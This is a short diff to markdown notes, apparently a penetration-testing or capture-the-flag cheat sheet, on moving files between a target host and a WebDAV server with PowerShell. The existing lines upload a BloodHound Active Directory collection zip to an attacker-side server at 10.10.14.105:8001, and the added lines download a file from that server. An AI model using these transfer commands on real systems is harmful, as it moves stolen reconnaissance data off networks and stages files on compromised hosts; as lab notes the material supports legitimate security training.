@@ -37,3 +37,7 @@ Finally check if server is up and listening on port 8001
     Invoke-WebRequest -uri http://<webdav_server_ip>:<web_davserver_port>/<file_name_to_be_saved_in_the_server> -Method Put -Infile <path_to_file_we_want_to_upload>
 
     Invoke-Webrequest -uri http://10.10.14.105:8001/bh.zip -Method Put -Infile 20241112043034_BloodHound.zip
+
+## Download a file to remote host from the webdav server using powershell
+
+    Invoke-Webrequest -uri http://10.10.14.105:8001/test.txt -Method Get -OutFile .\test.txt
